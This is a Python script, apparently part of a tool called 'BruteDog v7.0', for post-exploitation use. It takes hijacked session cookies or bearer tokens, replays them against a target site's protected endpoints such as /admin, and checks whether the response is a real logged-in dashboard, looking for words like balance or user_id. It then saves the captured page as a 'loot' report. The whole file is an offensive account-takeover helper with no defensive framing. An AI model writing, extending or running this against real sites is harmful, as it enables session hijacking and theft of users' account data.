#!/usr/bin/env python3
"""
LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification
Features:
- Live injection of hijacked tokens or cookie jars into protected endpoints
- Response HTML/DOM inspection (extracting headings, titles, and unique user data)
- Strict differentiation between genuine dashboard access and public SPA shells
- Automatic HTML report generation for visual verification via HTML viewers
"""
import sys
import os
import httpx
from urllib.parse import urlsplit

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def save_loot_report(endpoint, status, headers, body):
    """
    Saves the verified response into a clean, standalone HTML file 
    optimized for viewing in any mobile or desktop HTML viewer.
    """
    filename = "session_loot_report.html"
    
    # If the response is raw JSON, wrap it nicely in HTML/CSS for readability
    if body.strip().startswith("{") or body.strip().startswith("["):
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BruteDog v7.0 — Verified Session Loot</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 800px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
        h2 {{ color: #38bdf8; margin-top: 0; }}
        pre {{ background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #34d399; font-size: 14px; }}
        .meta {{ color: #94a3b8; font-size: 0.9rem; margin-bottom: 1rem; }}
    </style>
</head>
<body>
    <div class="card">
        <h2>🔓 Verified Session Loot / Data Dump</h2>
        <div class="meta"><strong>Endpoint:</strong> {endpoint} | <strong>Status Code:</strong> {status}</div>
        <h3>Response Payload (JSON):</h3>
        <pre>{body}</pre>
    </div>
</body>
</html>
"""
    else:
        # If it's HTML, ensure styles or base tags don't break, or save it directly
        html_content = body

    with open(filename, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    log(f"[+] Successfully exported verified dashboard/balance view to local HTML file: {filename}", "\033[92m")
    return filename

def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    target_endpoint = f"{base_url}{endpoint}"
    log(f"\n[***] RED TEAM VERIFICATION: Testing live session against {target_endpoint} [***]", "\033[95m")

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    if token:
        headers["Authorization"] = f"Bearer {token}"

    cookies = cookie_dict or {}

    try:
        with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
            response = client.get(target_endpoint, headers=headers)
            status = response.status_code
            body = response.text

            # 1. Defend against SPA fallback shells (Next.js/React root elements returning 200 OK)
            is_spa_shell = (
                "<div id=\"root\"></div>" in body or 
                "<div id=\"__next\"></div>" in body or 
                "<div id=\"app\"></div>" in body or
                len(body.strip()) < 200
            )

            # 2. Look for true post-authentication indicators
            has_auth_indicators = any(k in body.lower() for k in [
                "admin panel", "dashboard", "user_id", "balance", 
                "welcome back", "logout", "settings", "cryptobyte", "account"
            ])

            if status == 200 and not is_spa_shell and has_auth_indicators:
                log(f"[!!!] SUCCESS! Verified True Authentication / Login at {endpoint} [HTTP {status}] [!!!]", "\033[91m")
                
                # Automatically save the viewable HTML report
                save_loot_report(endpoint, status, response.headers, body)
                return True
            else:
                log(f"[-] Verification Failed: Endpoint returned Status {status} or generic SPA shell (Access Denied / Unauthenticated).", "\033[93m")
                return False

    except Exception as exc:
        log(f"[-] Verification connection error: {exc}", "\033[91m")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 live_login_verifier.py <target_url> [endpoint]")
        sys.exit(1)
    
    target = sys.argv[1]
    ep = sys.argv[2] if len(sys.argv) > 2 else "/admin"
    execute_live_login_verification(target, ep)
